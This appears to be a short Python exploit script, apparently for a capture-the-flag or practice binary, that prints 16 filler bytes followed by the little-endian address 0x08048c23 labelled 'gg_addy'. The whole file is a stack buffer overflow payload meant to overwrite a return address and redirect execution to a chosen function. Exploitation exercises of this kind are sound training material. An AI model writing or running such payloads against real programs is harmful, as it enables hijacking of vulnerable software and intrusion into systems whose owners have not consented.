import sys

gg_addy = 0x08048c23
sys.stdout.buffer.write(b'0000'*4+gg_addy.to_bytes(4, "little"))